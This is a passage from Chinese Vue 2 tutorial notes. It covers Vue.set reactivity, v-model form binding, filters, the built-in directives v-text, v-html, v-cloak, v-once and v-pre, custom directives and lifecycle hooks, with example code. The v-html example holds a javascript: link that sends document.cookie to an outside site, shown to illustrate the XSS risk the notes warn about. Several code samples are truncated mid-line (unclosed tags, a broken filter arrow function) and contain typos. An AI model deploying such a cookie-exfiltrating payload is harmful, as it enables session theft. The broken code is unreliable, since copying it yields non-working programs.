>      - 通过setter实现监视，且要在new Vue时就要传入要监测的数据data
>        - 对象中后追加的属性（通过`==`直接赋值），Vue默认不做响应式处理
>        - 如需要响应式，使用以下API
>          - `Vue.set(target, propertyName/index, value)`
>          - `vm.$set(target, propertyName/index, value)`
>   3. 如何监测数组中的数据？
>      - 通过包裹数组更新元素的方法实现，本质上就是做了两件事
>        1. 调用原生数组对应的方法对数组进行操作
>        2. 重新解析模板，进而更新页面
>   4. 在Vue修改数组中某个元素一定要使用如下方法
>      1. `API`：`push()、shift()、unshift()、splice()、sort()、reverse()`
>      2. `Vue.set()`或`vm.$set()`
> - 特别注意
>   - *`Vue.set()`和`vm.$set()`不能给vm或vm的根数据对象（`vm._data`）添加属性！！*

```vue
<div id="root">
    <h1>学生信息</h1>
    <!--  -->
    <button @click="student.age++">年龄+1岁</button><br>
    <button @click="addSex">添加一个性别属性，默认值为男</button>
    <button @click="student.sex = '女'">修改性别</button><br>
    <button @click="addFriend">在列表首位添加一个朋友</button><br
    <button @click="updateFirstFriendName">修改第一个朋友的名字为
    <button @click="addHobby">添加一个爱好</button><br>
    <button @click="updateHobby">修改第一个爱好为：开车</button><
    <button @click="removeSmoke">过滤掉爱好中的抽烟</button>
    <h3>姓名：{{student.name}}</h3>
    <h3>年龄：{{student.age}}</h3>
    <h3 v-if="student.sex">性别：{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
        <li v-for="(h, index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h3>朋友们</h3>
    <ul>
        <li v-for="(f, index) in student.friends" :key="index">
            {{f.name}}---{{f.age}}
        </li>
    </ul>
</div>
<script>
    const vm = new Vue({
        el: '#root',
        data: {
            student: {
                name: 'tom',
                age: 18,
                hobby: ['抽烟', '喝酒', '烫头'],
                friends: [{
                        name: 'jerry',
                        age: 35
                    },
                    {
                        name: 'tony',
                        age: 36
                    }
                ]
            }
        },
        methods: {
            addSex() {
                Vue.set(this.student, 'sex', '男')
            },
            addFriend() {
                this.student.friends.unshift({
                    name: 'jack',
                    age: 37
                })
            },
            updateFirstFriendName(){
                this.student.friends[0].name = '张三'
            },
            addHobby(){
                this.student.hobby.push('学习')
            },
            updateHobby(){
                // this.student.hobby.splice(0,1,'开车')
                Vue.set(this.student.hobby,0,'开车')
            },
            removeSmoke(){
                this.student.hobby = this.student.hobby.filter((h
                    return h != '抽烟'
                })
            }
        },
    })
</script>
```

## 十四、收集表单数据

> - 收集表单数据
>   - `<input type="text">`：`v-model`收集的是`value`值，用户输入的就是`value`值
>   - `<input type="radio">`：`v-model`收集的是`value`值，切要给标签配置`value`值
>   - `<input type="checkbox">`
>     1. 没有配置input的value操作，那么收集的就是checked（勾选 or 未勾选，是布尔值）
>     2. 配置input的value属性
>        - v-model的初始值是`非数组`，那么收集的就是checked（勾选 or 未勾选，是布尔值）
>        - v-model的初始值是`数组`，那么收集的就是value组成的数组
> - 注意：v-model的三个修饰符
>   - `v-model.lazy`：等输入框失去焦点再收集里面的数据
>   - `v-model.number`：使输入的字符串转为有效数字
>   - `v-model.trim`：输入框首位空格过滤

```vue
<div id="root">
     <form>
        账号：<input type="text" v-model="account"><br><br>
        密码：<input type="number" v-model.number="password"><br><br>
        性别：
        男<input type="radio" v-model="sex" value="male" name="sex">
        女<input type="radio" v-model="sex" value="female" name="sex"><br><br>
        爱好：
        学习  <input type="checkbox" v-model="hobby" value="study">
        打游戏<input type="checkbox" v-model="hobby" value="game">
        吃饭  <input type="checkbox" v-model="hobby" value="eat"><br><br>
        所属校区：
        <select v-model="city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br><br>
        其它信息：
        <textarea v-model.lazy="other"></textarea><br><br>
        <input v-model="isAgree" type="checkbox">阅读并接受<a href="#">《用户协议》<
        <button>提供</button>
    </form>
    <input type="text">
    <input type="radio">
    <input type="checkbox">
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            account:'', // 账号
            password:'', // 密码
            sex:'', // sex
            hobby:[], // 爱好
            city:'beijing', // 校区
            other:'',// 其他信息
            isAgree: '' // 是否同意
        }
    })
</script>
```

## 十五、过滤器

> - 过滤器
>   - 定义：对要显示的数据进行特定格式化后再显示（简单逻辑处理）
>   - 语法
>     1. 注册过滤器：`Vue.filter(name,callback)`或`new Vue(filters:{})`
>     2. 使用过滤器：`{{xxx | 过滤器名}}`或`v-bind:属性 = "xxx | 过滤器名"`
>   - 注意：
>     - 过滤器也可以接受额外的参数、多个过滤器可以串联
>     - 并没有改变原本的数据，是产生新的对应数据

### 1. 效果——显示格式化后的时间

```vue
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{fmtTime}}</h3>
    <!-- methods实现 -->
    <h3>现在是：{{getFmtTime()}}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD')}}</h3>
</div>
<script>
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#root',
        data: {
            time: 1677842775774, //时间戳
        },
        computed: {
            fmtTime() {
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        methods: {
            getFmtTime() {
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        filters: {
            timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
                return dayjs(value).format(str)
            }
        }
    })
</script>
```

## 十六、内置指令

> - 学过的指令
>   - `v-bind`：单向绑定解析表达式，可简写为`:xxx`
>   - `v-model`：双向数据绑定
>   - `v-for`：遍历数组/对象/字符串
>   - `v-on`：绑定事件监听，可简写为`@`
>   - `v-if`：条件渲染（动态控制节点是否存在）
>   - `v-eles`：条件渲染（动态控制节点是否存在）
>   - `v-show`：条件渲染（动态控制节点是否展示）

### 1. v-text

> - `v-text`
>   - 作用：向其所在的节点中渲染文本内容
>   - 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}不会

```vue
<div id="root">
    <div>你好,{{name}}</div>
    <div v-text="name"></div>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            name:'cjj'
        }
    })
</script>
```

### 2. v-html

> - `v-html`
>   - 作用：向指定节点中渲染包括html结构的内容
>   - 与插值语法的区别
>     1. `v-html`会替换掉节点中的所有内容，{{xx}}不会
>     2. `v-html`可以识别html结构
>   - 注意：
>     - 在网站上动态渲染任意HTML是非常危险的，容易导致`XXS`攻击
>     - 一定要在可信的内容上使用`v-html`，不要用在用户提交的内容上

```vue
<div id="root">
    <div>你好,{{name}}</div>
    <div v-html="test"></div>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            name:'cjj',
            test:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我</a>'
        }
    })
</script>
```

### 3. v-cloak

> - `v-cloak`：没有值
>   - 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
>   - 使用css配合v-cloak可以解决网速慢时，页面展示出{{xxx}}的问题

```vue
<style>
    [v-cloak]{
        display: none;
    }
</style>
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            name:'cjj',
        }
    })
</script>
```

### 4. v-once

> - `v-once`
>   - v-once所在节点在初次动态渲染后，就视为静态内容了
>   - 以后数据的改变不会引起v-once所在结构的更新，可以用于`优化性能`

```vue
<div id="root">
    <h2 v-once>初始化的n值为：{{n}}</h2>
    <h2>当前的的n值为：{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            n:1,
        }
    })
</script>
```

### 5. v-pre

> - `v-pre`
>   - 跳过其所在节点的编译过程
>   - 可利用它跳过`没有使用指令语法、没有使用插值语法`的节点，加快编译速度

```vue
<div id="root">
    <h2 v-pre>Vue</h2>
    <h2>当前的的n值为：{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            n:1,
        }
    })
</script>
```

## 十七、自定义指令

> - 需求
>   - 定义一个`v-big`指令，和`v-text`指令功能类似，会把绑定节点的数值放大十倍
>   - 定义一个`v-fbind`指令，和`v-bind`功能类似，但可以让其绑定的input元素默认获取焦点

> - 自定义函数何时调用
>   - 指令与元素成功绑定时（一上来）
>   - 指令所在的模板被重新解析时
> - 自定义指令总结
>   1. 定义语法
>      - 局部指令
>        - `new Vue({directives:{指令名:配置对象}})`
>        - `new Vue({directives:{指令名:回调函数}})`
>      - 全局指令
>        - `Vue.directive(指令名，配置对象)`
>        - `Vue.directive(指令名，回调函数)`
>   2. 配置对象中常用的3个回调
>      - `bind()`：指令与元素成功绑定时（一上来）
>      - `inserted()`：指令所在元素被插入页面时
>      - `update()`：指令所在的模板被重新解析时
>   3. 注意
>      - 指令定义时不加`v-`，使用时需要加
>      - 指令名如果是多个单词，要用`kebab-case`命名方式，不要用camelCase命名

```vue
 <div id="root">
    <h2>当前的n值为：<span v-text="n"></span></h2>
    <h2>放大十倍的n值为：<span v-big="n"></span></h2>
    <button @click="n++">点我n++</button>
    <hr>
    <input type="text" v-fbind:value="n">
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            n: 1
        },
        directives: {
            big(element, binding) {
                console.log('big')
                element.innerText = binding.value * 10
            },
            fbind: {
                // 指令与元素成功绑定时（一上来
                bind(element, binding) {
                    element.value = binding.value
                },
                // 指令所在元素被插入页面时
                inserted(element, binding) {
                    element.focus()
                },
                // 指令所在的模板被重新解析时
                update(element, binding) {
                    element.value = binding.value
                }
            }
        }
    })
</script>
```

## 十八、生命周期`☆`

### 1. 引出生命周期

> - 生命周期
>   - 又名：生命周期回调函数、生命周期函数、生命周期钩子
>   - 是什么：Vue在关键的时刻帮我们调用的一些特殊名称的函数
>   - 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
>   - 生命周期函数中的this指向的是`vm`或`组件实例对象`

```vue
<div id="root">
    <h2 :style="{opacity}">欢迎学习Vue</h2>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            opacity:1
        },
        mounted() {
            setInterval(()=>{
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
    })
</script>
```

### 2. 生命周期流程

![image-20230305163214402](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748326.png)

![image-20230305163814608](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748327.png)

### 3. 总结

> - 常用生命周期钩子
>   - `mounted`：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等`【初始化操作】`
>   - `beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等`【收尾工作】`
> - 销毁Vue实例
>   - 销毁后借助Vue开发者工具看不到任何信息
>   - 销毁后自定义事件会失效，但原生DOM事件依然有效
>   - 一般不会再beforeDestroy操作数据，因为即便操作数据，也不会再触发`更新流程`了